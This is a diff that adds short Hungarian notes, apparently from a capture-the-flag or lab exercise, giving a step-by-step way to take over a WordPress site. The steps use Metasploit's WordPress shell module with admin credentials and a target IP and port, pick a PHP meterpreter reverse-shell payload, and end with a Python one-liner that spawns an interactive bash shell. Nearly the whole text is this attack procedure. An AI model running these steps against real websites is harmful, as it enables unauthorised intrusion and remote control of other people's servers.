@@ -1,0 +1,38 @@
+mar meg van rapelve a weboldal, nc, python 3 stb:
+
+
+masik megoldas kicsit konnyebb ha nem megy az elso:
+
+terminalba:
+
+msfconsole
+
+search wordpress shell
+(megkeressuk az admin oldalt) szamat kell hasznalni (pl 6 os)
+
+use 6
+
+(amiket meg kell adni
+jelszo
+célip
+célport (nmap el)
+mi van az ip utan az urlben (40.0.4.26 ! / !, zhn lehet mas pl /cica/xd/)
+felhasznalonev
+)
+pelda:
+
+set password finalfantasy
+set username admin
+set ...
+
+(use exploit/multi/handler)
+(show payloads (valasztani, de reverseshell php ban meterpreteres az jo xd ))
+
+run
+
+shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+(ide lehet irkalni)
+ 
